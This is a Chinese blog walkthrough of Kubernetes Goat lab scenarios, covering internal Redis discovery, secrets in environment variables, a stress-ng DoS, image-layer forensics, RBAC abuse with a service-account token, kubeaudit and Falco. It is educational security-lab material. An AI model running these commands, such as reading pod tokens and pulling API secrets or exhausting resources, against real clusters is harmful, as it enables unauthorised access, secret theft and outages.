class="line">AMASS_VERSION=3.6.3</span><br><span class="line">CONFTEST_VERSION=0.21.0</span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443</span><br><span class="line">BUILD_CODE_SERVICE_SERVICE_HOST=10.106.27.124</span><br><span class="line">METADATA_DB_SERVICE_HOST=10.98.7.222</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.96.0.1</span><br><span class="line">SYSTEM_MONITOR_SERVICE_PORT=tcp://10.97.185.173:8080</span><br><span class="line">SYSTEM_MONITOR_SERVICE_SERVICE_PORT=8080</span><br><span class="line">PWD=/root</span><br><span class="line">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_ADDR=10.104.234.145</span><br><span class="line">KUBEBENCH_VERSION=0.3.0</span><br><span class="line">HEALTH_CHECK_SERVICE_PORT=tcp://10.100.251.255:80</span><br><span class="line">HEALTH_CHECK_SERVICE_SERVICE_PORT=80</span><br><span class="line">GITLEAKS_VERSION=8.8.11</span><br><span class="line">TLDR_VERSION=0.6.1</span><br><span class="line">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP=tcp://10.97.185.173:8080</span><br><span class="line">BUILD_CODE_SERVICE_SERVICE_PORT=3000</span><br><span class="line">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PORT=3000</span><br><span class="line">BUILD_CODE_SERVICE_PORT=tcp://10.106.27.124:3000</span><br></pre></td></tr></table></figure>
+
+
+
+<p>根据上述环境信息，可以开展进一步扫描活动，这里的目标是一个redis数据库，默认端口为6379，因此使用nmap工具在当前网段内扫描：<code>nmap -sT -open -p 6379 10.244.0.0/16</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240813211806316.png" alt="image-20240813211806316"></p>
+<p>发现一个10.244.0.13，使用redis客户端访问上去：<code>redis-cli -h 10.244.0.13</code></p>
+<p>获取所有键：<code>KEYS *</code></p>
+<p>发现有一个”SECRETSTUFF“，GET一下，得到flag</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240813212025483.png" alt="image-20240813212025483"></p>
+<p>done</p>
+<h2 id="11-3-总结"><a href="#11-3-总结" class="headerlink" title="11.3 总结"></a>11.3 总结</h2><p>命令：</p>
+<ul>
+<li>查看路由信息：<code>ip route</code></li>
+<li>nmap扫描特定服务：<code>nmap -sT -open -p 6379 10.244.0.0/16</code></li>
+<li>redis获取所有键：<code>KEYS *</code></li>
+</ul>
+<p>端口：</p>
+<ul>
+<li>redis：6379</li>
+</ul>
+<h1 id="12-Gaining-environment-information"><a href="#12-Gaining-environment-information" class="headerlink" title="12 Gaining environment information"></a>12 Gaining environment information</h1><h2 id="12-1-Overview"><a href="#12-1-Overview" class="headerlink" title="12.1 Overview"></a>12.1 Overview</h2><p>运行应用程序时，大多数计算实例将机密、api_keys等敏感信息存储在环境变量中。同样，在Kubernetes中，大多数人将Kubernetes  Secrets和Config值等敏感信息存储在环境变量中，如果攻击者可以发现RCE（远程代码执行）或命令注入等应用程序漏洞，那么对该Secrets的攻击就结束了。</p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>如何探索环境变量并进行分析</li>
+<li>访问容器中的敏感信息</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>Kubernetes中的每个环境都有很多信息可以共享。一些关键内容包括secrets、API密钥、配置、服务等等。所以，让我们继续找保险库钥匙吧！</p>
+<p><strong>目标</strong></p>
+<p>取得k8s_goal_flag flag。</p>
+<h2 id="12-2-Solution-Walkthrough"><a href="#12-2-Solution-Walkthrough" class="headerlink" title="12.2 Solution &amp; Walkthrough"></a>12.2 Solution &amp; Walkthrough</h2><h3 id="12-2-1-Method-1"><a href="#12-2-1-Method-1" class="headerlink" title="12.2.1 Method 1"></a>12.2.1 Method 1</h3><p>访问目标站点，得到一个shell</p>
+<p>以下是探索容器环境信息的若干命令：</p>
+<ul>
+<li>cgroup信息：<code>cat /proc/self/cgroup</code></li>
+<li>hosts文件（内网信息）：<code>cat /etc/hosts</code></li>
+<li>环境变量：<code>env</code>&#x2F;<code>printenv</code></li>
+</ul>
+<p>其中环境变量那里包含了我们的flag：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240813213607253.png" alt="image-20240813213607253"></p>
+<p>done</p>
+<h1 id="13-DoS-the-Memory-CPU-resources"><a href="#13-DoS-the-Memory-CPU-resources" class="headerlink" title="13 DoS the Memory&#x2F;CPU resources"></a>13 DoS the Memory&#x2F;CPU resources</h1><h2 id="13-1-Overview"><a href="#13-1-Overview" class="headerlink" title="13.1 Overview"></a>13.1 Overview</h2><p>Kubernetes解决的核心问题之一是资源的管理，如自动缩放、部署等。在这种情况下，我们将看到，如果没有对集群资源（如内存和CPU请求和限制）实施资源管理配置，攻击者如何通过执行DoS（拒绝服务）来利用和访问更多资源或对资源的可用性造成影响。</p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>学习使用<code>stress-ng</code>对计算和内存资源执行DoS</li>
+<li>了解Pod和容器的Kubernetes资源管理</li>
+<li>使用metrics和信息探索Kubernetes资源监控</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>Kubernetes manifests中没有资源规范，也没有容器的应用限制范围。作为攻击者，我们可以消耗运行pod&#x2F;部署的所有资源，并耗尽其他资源，从而对环境造成DoS。</p>
+<p><strong>目标</strong></p>
+<p>通过消耗2GB内存来成功完成场景，超出此pod&#x2F;容器预期的资源。</p>
+<h2 id="13-2-Solution-Walkthrough"><a href="#13-2-Solution-Walkthrough" class="headerlink" title="13.2 Solution &amp; Walkthrough"></a>13.2 Solution &amp; Walkthrough</h2><h3 id="13-2-1-Method-1"><a href="#13-2-1-Method-1" class="headerlink" title="13.2.1 Method 1"></a>13.2.1 Method 1</h3><p>访问目标站点，得到一个shell，同时标识这个pod是“hunger-check-deployment-755b7d6bb6-6g7w4”</p>
+<p>检视一下这个pod：<code>kubectl describe pod -n big-monolith hunger-check-deployment-755b7d6bb6-6g7w4</code></p>
+<p>发现并没有找到资源限制相关的信息</p>
+<p>看一下部署这个pod时的yaml：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">hunger-check</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">hunger-check</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">big-monolith-sa</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hunger-check</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">madhuakula/k8s-goat-hunger-check</span></span><br><span class="line">        <span class="comment"># resources:</span></span><br><span class="line">        <span class="comment">#   limits:</span></span><br><span class="line">        <span class="comment">#     memory: &quot;1000Gi&quot;</span></span><br><span class="line">        <span class="comment">#   requests:</span></span><br><span class="line">        <span class="comment">#     memory: &quot;1000Gi&quot;</span></span><br><span class="line">        <span class="comment"># command: [&quot;stress-ng&quot;]</span></span><br><span class="line">        <span class="comment"># args: [&quot;--vm&quot;, &quot;1&quot;, &quot;--vm-bytes&quot;, &quot;500M&quot;, &quot;--vm-hang&quot;, &quot;1&quot;, &quot;-v&quot;]</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<p>发现应有的资源限制字段都被注释掉了，也就是说，这个pod的运行是没有资源限制的</p>
+<p>要模拟发动DoS攻击的话，直接在那个shell里面执行像是<code>stress-ng</code>这样的压测工具就OK：</p>
+<p><code>stress-ng --vm 2 --vm-bytes 2G --timeout 30s</code></p>
+<p>然后通过这个命令检视pod资源消耗情况：</p>
+<p><code>kubectl --namespace big-monolith top pod hunger-check-deployment-755b7d6bb6-6g7w4</code></p>
+<p>done</p>
+<h2 id="13-3-总结"><a href="#13-3-总结" class="headerlink" title="13.3 总结"></a>13.3 总结</h2><p>工具：</p>
+<ul>
+<li>压测工具：<code>stress-ng</code></li>
+</ul>
+<p>命令：</p>
+<ul>
+<li>使用<code>stress-ng</code>进行压测：<code>stress-ng --vm 2 --vm-bytes 2G --timeout 30s</code></li>
+<li>K8S检查pod资源消耗：<code>kubectl --namespace big-monolith top pod hunger-check-deployment-755b7d6bb6-6g7w4</code></li>
+</ul>
+<h1 id="14-Hacker-container-preview"><a href="#14-Hacker-container-preview" class="headerlink" title="14 Hacker container preview"></a>14 Hacker container preview</h1><h2 id="14-1-Overview"><a href="#14-1-Overview" class="headerlink" title="14.1 Overview"></a>14.1 Overview</h2><p>在执行和测试容器或Kubernetes基础设施时，我们总是必须在容器内安装一些常用工具来执行进一步的开发，然后在集群内移动。因此，Hacker  Container是一个简单的基于alpine的docker容器，具有常用的工具和实用程序，同时对容器化和Kubernetes集群环境进行安全评估。</p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>使用黑客容器并探索多种常见的安全工具、命令</li>
+<li>使用黑客容器进行枚举、利用和后利用</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>此场景只是对Kubernetes集群环境中常见安全实用程序的探索。</p>
+<p><strong>目标</strong></p>
+<p>成功运行了黑客容器并探索了可用的不同工具和实用程序。</p>
+<h2 id="14-2-Solution-Walkthrough"><a href="#14-2-Solution-Walkthrough" class="headerlink" title="14.2 Solution &amp; Walkthrough"></a>14.2 Solution &amp; Walkthrough</h2><h3 id="14-2-1-Method-1"><a href="#14-2-1-Method-1" class="headerlink" title="14.2.1 Method 1"></a>14.2.1 Method 1</h3><p>启动这个嗨阔pod：<code>kubectl run -it hacker-container --image=madhuakula/hacker-container --image-pull-policy=Never -- sh</code></p>
+<p>有一个很有用的容器自检与系统Capabilities获取工具：<code>amicontained</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240814210646890.png" alt="image-20240814210646890"></p>
+<p>给出了很多容器环境以及自检相关的信息</p>
+<p>还可以使用Nikto去扫描内部服务：<code>nikto.pl -host http://metadata-db</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240814210940793.png" alt="image-20240814210940793"></p>
+<p>给出了目标站点的基本防护信息</p>
+<p>还有许多其他用例。为了最大限度地利用黑客容器，我们可以使用主机权限、卷、进程等。我们将很快更新更多详细信息。</p>
+<p>done？</p>
+<h2 id="14-3-总结"><a href="#14-3-总结" class="headerlink" title="14.3 总结"></a>14.3 总结</h2><p>工具：</p>
+<ul>
+<li>容器自检以及系统Capabilities获取工具：<code>amicontained</code></li>
+<li>Web站点扫描工具：<code>nikto.pl</code></li>
+</ul>
+<h1 id="15-Hidden-in-layers"><a href="#15-Hidden-in-layers" class="headerlink" title="15 Hidden in layers"></a>15 Hidden in layers</h1><h2 id="15-1-Overview"><a href="#15-1-Overview" class="headerlink" title="15.1 Overview"></a>15.1 Overview</h2><p>互联网上下载和使用的大多数容器图像都是由其他人创建的。如果我们不知道它们是如何创建的（这意味着如果我们没有Dockerfile），那么我认为我们有时可能会遇到麻烦。在这种情况下，我们可以看到如何使用内置实用程序以及一些流行的开源实用程序（如dive）来分析docker容器映像层，以了解容器映像层。</p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>如何探索和分析docker容器镜像</li>
+<li>使用<code>dive</code>等开源工具执行容器镜像分析</li>
+<li>能够使用标准命令行实用程序</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>敏感信息泄露是世界上最常见的漏洞之一。在容器化世界中，密码、私钥、令牌等的错误处理很容易。在这种情况下，我们将分析并确定一种导致敏感信息披露的处理不当的不良做法。</p>
+<p>通过<code>kubetcl get jobs</code>查看当前集群的job情况，有一个”hidden-in-layers“</p>
+<p><strong>目标</strong></p>
+<p>在容器的一个隐藏层中找到<code>k8s_goal_flag</code> flag。</p>
+<h2 id="15-2-Solution-Walkthrough"><a href="#15-2-Solution-Walkthrough" class="headerlink" title="15.2 Solution &amp; Walkthrough"></a>15.2 Solution &amp; Walkthrough</h2><p>首先从Docker自带的检视命令开始：<code>docker inspect madhuakula/k8s-goat-hidden-in-layers</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240814211631267.png" alt="image-20240814211631267"></p>
+<p>可以看到该镜像启动时所运行的命令</p>
+<p>但是还不够，需要从该镜像的构建过程入手，但是这里我们没有构建时使用的Dockerfile，因此需要通过别的方式去分析</p>
+<h3 id="15-2-1-Method-1"><a href="#15-2-1-Method-1" class="headerlink" title="15.2.1 Method 1"></a>15.2.1 Method 1</h3><p>一个是通过Docker的<code>history</code>命令，检查这个容器在构建过程都做了什么：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240814211952287.png" alt="image-20240814211952287"></p>
+<p><del>进到这个pod的shell：</del></p>
+<p>这样看上去像是在&#x2F;root&#x2F;路径下添加了secrets.txt文件，但是上面一行又把它删掉了，因此进到pod的shell里面是找不出的</p>
+<p>因此需要找到别的方法</p>
+<h3 id="15-2-2-Method-2"><a href="#15-2-2-Method-2" class="headerlink" title="15.2.2 Method 2"></a>15.2.2 Method 2</h3><p>有一个工具<code>dfimage</code>，可以通过一个现有的镜像来生成对应的Dockerfile</p>
+<p><code>alias dfimage=&quot;docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage&quot;</code></p>
+<p><code>dfimage -sV=1.36 madhuakula/k8s-goat-hidden-in-layers</code></p>
+<p>但是这里生成失败了，生成成功的样子：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-15-3-de3464a79440be4925fe8c24f4cc45e4.png" alt="sc-15-3-de3464a79440be4925fe8c24f4cc45e4"></p>
+<h3 id="15-2-3-Method-3"><a href="#15-2-3-Method-3" class="headerlink" title="15.2.3 Method 3"></a>15.2.3 Method 3</h3><p>或者可以使用<code>dive</code>，去分析容器镜像的每一层</p>
+<p>安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DIVE_VERSION=$(curl -sL <span class="string">&quot;https://api.github.com/repos/wagoodman/dive/releases/latest&quot;</span> | grep <span class="string">&#x27;&quot;tag_name&quot;:&#x27;</span> | sed -E <span class="string">&#x27;s/.*&quot;v([^&quot;]+)&quot;.*/\1/&#x27;</span>)</span><br><span class="line">curl -OL https://github.com/wagoodman/dive/releases/download/v<span class="variable">$&#123;DIVE_VERSION&#125;</span>/dive_<span class="variable">$&#123;DIVE_VERSION&#125;</span>_linux_amd64.deb</span><br><span class="line"><span class="built_in">sudo</span> apt install ./dive_<span class="variable">$&#123;DIVE_VERSION&#125;</span>_linux_amd64.deb</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-15-4-0-8595467c2f7278386a46bc2946ce87fd.png" alt="sc-15-4-0-8595467c2f7278386a46bc2946ce87fd"></p>
+<p>获取一定信息之后，就要尝试文件恢复</p>
+<p>利用Docker的命令将Docker镜像导出：</p>
+<ol>
+<li><code>docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar</code></li>
+<li><code>tar -xvf hidden-in-layers.tar</code></li>
+</ol>
+<p>接着就可以逐层分析</p>
+<p>&#x3D;&#x3D;这里又有问题了&#x3D;&#x3D;</p>
+<p>这里解压出来的镜像文件，没有要用到的tar包：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240814215049588.png" alt="image-20240814215049588"></p>
+<p>正常解压出来的文件be like：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-15-6-8b5731a3b30763077b34b43a6b063a41.png" alt="sc-15-6-8b5731a3b30763077b34b43a6b063a41"></p>
+<p>理论上应该是有tar包的，才可以解压出每一层进行的文件改动，才能找到被删掉的secret.txt</p>
+<p>&#x3D;&#x3D;照着思路看下去咯&#x3D;&#x3D;</p>
+<p>通过<code>dive</code>工具，找到secret.txt创建时对应层的SHA256值：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-15-4-1-8b2e090e319f55a330d048f833d93920.png" alt="sc-15-4-1-8b2e090e319f55a330d048f833d93920"></p>
+<p>然后直接cd到对应解包出来的路径，解压<code>layer.tar</code>，就可以看到被删掉的文件了：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-15-7-fe2620148e4f8a4d77a0a7972f87d960.png" alt="sc-15-7-fe2620148e4f8a4d77a0a7972f87d960"></p>
+<p>done？</p>
+<h2 id="15-3-总结"><a href="#15-3-总结" class="headerlink" title="15.3 总结"></a>15.3 总结</h2><p>命令：</p>
+<ul>
+<li>Docker检查容器构建命令：<code>docker history --no-trunc &lt;image-name&gt;</code></li>
+<li>Docker打包镜像文件：<code>docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar</code></li>
+</ul>
+<p>工具：</p>
+<ul>
+<li>从镜像还原Dockerfile（Docker化）：<code>alpine/dfimage</code></li>
+<li>镜像检视工具：<code>dive</code></li>
+</ul>
+<h1 id="16-RBAC-least-privileges-misconfiguration"><a href="#16-RBAC-least-privileges-misconfiguration" class="headerlink" title="16 RBAC least privileges misconfiguration"></a>16 RBAC least privileges misconfiguration</h1><h2 id="16-1-Overview"><a href="#16-1-Overview" class="headerlink" title="16.1 Overview"></a>16.1 Overview</h2><p>大多数现实世界的工作负载和资源最终都拥有比预期更广泛的特权。在这种情况下，我们将看到像这样简单的配置错误是如何获得secrets、更多资源和信息的。</p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>使用REST API访问和与Kubernetes API服务器通信</li>
+<li>使用不同的Kubernetes资源并查询它们</li>
+<li>利用配置错误&#x2F;过于宽松的权限访问敏感信息和资源</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>在现实世界中，我们经常看到开发人员和DevOps团队倾向于提供超出所需的额外权限。这为攻击者提供了比预期更多的控制和权限。在这种情况下，您可以利用绑定到pod的服务帐户来提供<code>webhookapikey</code>访问，但使用此攻击者可以获得对其他秘密和资源的控制。</p>
+<p><a target="_blank" rel="noopener" href="https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/">这里</a>给出了从pod中访问Kubernetes API的方法说明</p>
+<p><strong>目标</strong></p>
+<p>利用RBAC权限访问Kubernetes secret <code>k8svaultapikey</code>来完成此场景，从而找到<code>k8s_goat_flag</code> flag</p>
+<h2 id="16-2-Solution-Walkthrough"><a href="#16-2-Solution-Walkthrough" class="headerlink" title="16.2 Solution &amp; Walkthrough"></a>16.2 Solution &amp; Walkthrough</h2><h3 id="16-2-1-Method-1"><a href="#16-2-1-Method-1" class="headerlink" title="16.2.1 Method 1"></a>16.2.1 Method 1</h3><p>该deployment有一个过于宽松的策略&#x2F;权限映射的<code>ServiceAccount</code>，作为攻击者，我们可以利用这一点来访问其他资源和服务。</p>
+<p>默认情况下，Kubernetes将所有令牌和服务帐户信息存储在默认位置：<code>/var/run/secrets/kubernetes.io/serviceaccount/</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240819212821431.png" alt="image-20240819212821431"></p>
+<p>发现有证书、token啥的，看着就像是和Kubernetes API通信的凭证</p>
+<p>从环境变量中获取API Server的地址：<code>export APISERVER=https://$&#123;KUBERNETES_SERVICE_HOST&#125;</code></p>
+<p>设置<code>ServiceAccount</code> token的路径：<code>export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount</code></p>
+<p>设置namespace的值：<code>export NAMESPACE=$(cat $&#123;SERVICEACCOUNT&#125;/namespace)</code></p>
+<p>设置ServiceAccount的token：<code>export TOKEN=$(cat $&#123;SERVICEACCOUNT&#125;/token)</code></p>
+<p>设置证书路径，在发送curl请求时用得到：<code>export CACERT=$&#123;SERVICEACCOUNT&#125;/ca.crt</code></p>
+<p>设置好之后，尝试构建查询来访问K8S API：<code>curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240819214017603.png" alt="image-20240819214017603"></p>
+<p>OK！接下来就直接尝试访问默认命名空间中的secrets资源：<code>curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/secrets</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240819214312955.png" alt="image-20240819214312955"></p>
+<p>但是被拒绝了，这个token在默认命名空间中没有权限</p>
+<p>访问token持有者所属的命名空间呢？<code>curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/secrets</code></p>
+<p>这次就可以返回secrets资源列表了</p>
+<p>提取我们的目标：<code>curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/secrets | grep k8svaultapikey </code></p>
+<p>得到字段为：<code>azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=</code></p>
+<p>base64解码一下：<code>echo &quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=&quot; | base64 -d</code></p>
+<p>成功获得flag</p>
+<p>done</p>
+<blockquote>
+<p>下面查询这个命名空间中的pod列表：<code>curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/pods</code></p>
+<p>OK</p>
+</blockquote>
+<h2 id="16-3-总结"><a href="#16-3-总结" class="headerlink" title="16.3 总结"></a>16.3 总结</h2><p>路径：</p>
+<ul>
+<li>能和K8S API Server通信的pod中，token等默认的存储位置：<code>/var/run/secrets/kubernetes.io/serviceaccount/</code></li>
+<li>容器环境中可能存在的K8S API Server地址变量：<code>KUBERNETES_SERVICE_HOST</code></li>
+<li>发起请求时，一般要带上：证书、token、namespace（<code>--cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot;</code>）</li>
+</ul>
+<h1 id="17-KubeAudit-Audit-Kubernetes-clusters"><a href="#17-KubeAudit-Audit-Kubernetes-clusters" class="headerlink" title="17 KubeAudit - Audit Kubernetes clusters"></a>17 KubeAudit - Audit Kubernetes clusters</h1><h2 id="17-1-Overview"><a href="#17-1-Overview" class="headerlink" title="17.1 Overview"></a>17.1 Overview</h2><p>此场景在执行Kubernetes安全审计和评估时非常有用。在这里，我们将学习为Kubernetes集群运行一个名为<code>kubeaudit</code>的开源工具，并将结果用于进一步利用或修复配置错误和漏洞。如果你来自现代容器、Kubernetes和云原生生态系统的审计和合规背景，这一点非常重要，也是必须的。</p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>学习如何对Kubernetes集群执行Kubernetes审计</li>
+<li>使用开源工具对集群资源进行审计和调查</li>
+<li>了解整个Kubernetes集群的安全态势并了解风险</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>此场景主要是使用Shopify的开源工具<a target="_blank" rel="noopener" href="https://github.com/Shopify/kubeaudit">kubeaudit</a>对Kubernetes集群进行各种安全问题的审计。</p>
+<p>以集群管理员权限启动嗨阔容器（tiller这个service account具有这个权限）：<code>kubectl run -n kube-system --serviceaccount=tiller --rm --restart=Never --image-pull-policy=Never -it --image=madhuakula/hacker-container -- bash</code></p>
+<p>&#x3D;&#x3D;有问题，我的kubectl说识别不了 –serviceaccount 这个参数&#x3D;&#x3D;</p>
+<p><strong>目标</strong></p>
+<p>此场景的目标是执行Kubernetes安全审计并获得审计结果。</p>
+<h2 id="17-2-Solution-Walkthrough"><a href="#17-2-Solution-Walkthrough" class="headerlink" title="17.2 Solution &amp; Walkthrough"></a>17.2 Solution &amp; Walkthrough</h2><h3 id="17-2-1-Method-1"><a href="#17-2-1-Method-1" class="headerlink" title="17.2.1 Method 1"></a>17.2.1 Method 1</h3><blockquote>
+<p><code>kubeaudit</code>是一个命令行工具和Go包，用于审计Kubernetes集群的各种安全问题，例如：</p>
+<ul>
+<li>以非root身份运行</li>
+<li>使用只读根文件系统</li>
+<li>放弃可怕的capabilities，不要添加新的capabilities</li>
+<li>不要运行特权</li>
+<li>以及更多！</li>
+</ul>
+<p>请参阅<a target="_blank" rel="noopener" href="https://github.com/Shopify/kubeaudit%E6%9C%89%E5%85%B3%E8%AF%A5%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%9B%B4%E5%A4%9A%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF">https://github.com/Shopify/kubeaudit有关该项目的更多详细信息</a></p>
+</blockquote>
+<p>理论上，通过这个命令以tiller服务账户启动一个黑客容器：<code>kubectl run -n kube-system --serviceaccount=tiller --rm --restart=Never --image-pull-policy=Never -it --image=madhuakula/hacker-container -- bash</code></p>
+<p>然后直接执行<code>kubeaudit all</code>就可以自动化审计了</p>
+<p>done？</p>
+<h2 id="17-3-总结"><a href="#17-3-总结" class="headerlink" title="17.3 总结"></a>17.3 总结</h2><p>工具：</p>
+<ul>
+<li>K8S集群安全审计工具：<code>kubeaudit</code></li>
+</ul>
+<h1 id="18-Falco-Runtime-security-monitoring-detection"><a href="#18-Falco-Runtime-security-monitoring-detection" class="headerlink" title="18 Falco - Runtime security monitoring &amp; detection"></a>18 Falco - Runtime security monitoring &amp; detection</h1><h2 id="18-1-Overview"><a href="#18-1-Overview" class="headerlink" title="18.1 Overview"></a>18.1 Overview</h2><p>容器及其基础设施是不可变的。这意味着使用传统工具和技术很难检测到某些攻击、漏洞和检测。在这种情况下，我们将看到如何利用Falco等流行的开源工具来检测和执行运行时安全监控。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-18-a535e6e5ea439f1e6e68eaaa4d71b4e1.png" alt="scenario-18-a535e6e5ea439f1e6e68eaaa4d71b4e1"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>将helm chart部署到Kubernetes集群中</li>
+<li>在Kubernetes集群中执行日志分析和安全事件检测</li>
+<li>使用Falco近乎实时地使用、分析和检测安全问题</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>此场景是为容器和Kubernetes资源部署运行时安全监控和检测。此外，探索并了解如何检测某些问题，并基于触发器执行检测规则分析。</p>
+<p>需要使用helm为K8S集群安装falco组件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">helm repo add falcosecurity https://falcosecurity.github.io/charts</span><br><span class="line">helm repo update</span><br><span class="line">helm install falco falcosecurity/falco</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Falco官方文档：<a target="_blank" rel="noopener" href="https://falco.org/docs/">https://falco.org/docs/</a></p>
+<p><strong>目标</strong></p>
+<p>部署Falco，并使用预定义的规则集近乎实时地检测安全事件。</p>
+<h2 id="18-2-Solution-Walkthrough"><a href="#18-2-Solution-Walkthrough" class="headerlink" title="18.2 Solution &amp; Walkthrough"></a>18.2 Solution &amp; Walkthrough</h2><h3 id="18-2-1-Method-1"><a href="#18-2-1-Method-1" class="headerlink" title="18.2.1 Method 1"></a>18.2.1 Method 1</h3><blockquote>
+<p><code>Falco</code>是云原生运行时安全项目，是事实上的Kubernetes威胁检测引擎。Falco由Sysdig于2016年创建，是第一个作为孵化级项目加入CNCF的运行时安全项目。Falco在运行时检测到意外的应用程序行为并发出威胁警报。</p>
+</blockquote>
+<p>Falco通过以下方式使用系统调用来保护和监控系统：</p>
+<ul>
+<li>在运行时解析来自内核的Linux系统调用</li>
+<li>使用强大的规则引擎进行断言</li>
+<li>违反规则时发出警报</li>
+</ul>
+<p>Falco附带了一组默认规则，用于检查内核是否存在异常行为，例如：</p>
+<ul>
+<li>使用特权容器进行特权升级</li>
+<li>使用<code>setns</code>等工具更改命名空间</li>
+<li>读&#x2F;写到众所周知的目录，如&#x2F;etc、&#x2F;usr&#x2F;bin、&#x2F;usr&#x2F;sbin等</li>
+<li>创建符号链接</li>
+<li>所有权和模式变更</li>
+<li>意外的网络连接或套接字改变</li>
